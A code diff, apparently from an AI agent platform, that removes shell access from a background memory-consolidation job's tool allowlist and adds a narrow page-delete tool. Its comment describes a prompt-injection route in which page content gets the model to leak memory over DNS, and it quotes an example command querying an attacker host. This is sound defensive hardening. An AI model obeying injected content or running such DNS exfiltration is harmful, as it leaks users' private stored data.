@@ -122,10 +122,17 @@ const JOB_NAME = "memory.consolidate";
  * the model, so the fix does not rely on the permission threshold. Mirrors the
  * hardening the sibling memory-retrospective job already applies.
  *
- * `bash` is included because page deletes/renames go through the shell (there
- * is no dedicated file-delete tool) and corpus operations need it; its
- * dangerous / networked invocations remain risk-classified and denied in this
- * background context regardless.
+ * `bash` is deliberately EXCLUDED. A shell reopens the egress channel this
+ * allowlist exists to close: `dig` / `nslookup` / `ping` classify Low in the
+ * command registry and so auto-approve in this background context, letting
+ * prompt-injected page content exfiltrate memory over DNS (`dig
+ * <secret>.attacker.example`) even with `web_fetch` hidden. The one
+ * page-maintenance operation a shell would otherwise handle — retiring a
+ * merged/renamed/dead page — is served by `delete_memory_page`, a slug-scoped
+ * memory-page delete that reaches only `memory/concepts/**` and carries no
+ * network or arbitrary-path reach. It is an allowlist-only tool (hidden from
+ * every other tool surface; see `ALLOWLIST_ONLY_TOOL_NAMES`), so naming it here
+ * is what surfaces it.
  */
 const CONSOLIDATION_ALLOWED_TOOLS: readonly string[] = [
   "file_read",
@@ -133,7 +140,7 @@ const CONSOLIDATION_ALLOWED_TOOLS: readonly string[] = [
   "file_edit",
   "file_list",
   "code_search",
-  "bash",
+  "delete_memory_page",
   "recall",
 ];
 
